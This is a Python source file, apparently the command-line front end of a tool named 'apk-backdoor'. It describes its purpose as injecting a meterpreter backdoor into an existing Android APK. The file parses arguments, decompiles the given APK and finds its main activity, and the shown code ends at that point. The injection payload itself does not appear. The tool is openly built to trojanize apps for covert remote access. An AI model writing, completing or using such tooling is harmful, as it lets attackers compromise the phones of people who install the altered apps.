import argparse
import logging

from . import __version__
from .apk import Apk


def setup_args():
    parser = argparse.ArgumentParser(
        description='Inject a meterpreter backdoor in an existing APK',
        prog='apk-backdoor',
    )

    parser.add_argument(
        '-v', '--version',
        action='version',
        version=f"%(prog)s - v{__version__}"
    )

    parser.add_argument(
        'apk',
        metavar='APK',
        help='The APK where the backdoor will be injected',
    )

    parser.add_argument(
        '-V', '--verbose',
        dest='verbosity',
        action='count',
        default=0,
        help='Verbosity level (between 1 and 4 occurrences with '
             'more leading to a more verbose logging). '
             'CRITICAL = 0, ERROR = 1, WARN = 2, INFO = 3, DEBUG = 4.'
    )
    log_levels = {
        0: logging.CRITICAL,
        1: logging.ERROR,
        2: logging.WARN,
        3: logging.INFO,
        4: logging.DEBUG,
    }

    args = parser.parse_args()
    args.verbosity = log_levels[args.verbosity]
    return args


def main():
    args = setup_args()
    logging.basicConfig(level=args.verbosity)

    apk = Apk(args.apk)
    apk.decompile()
    main_activity = apk.get_main_activity()
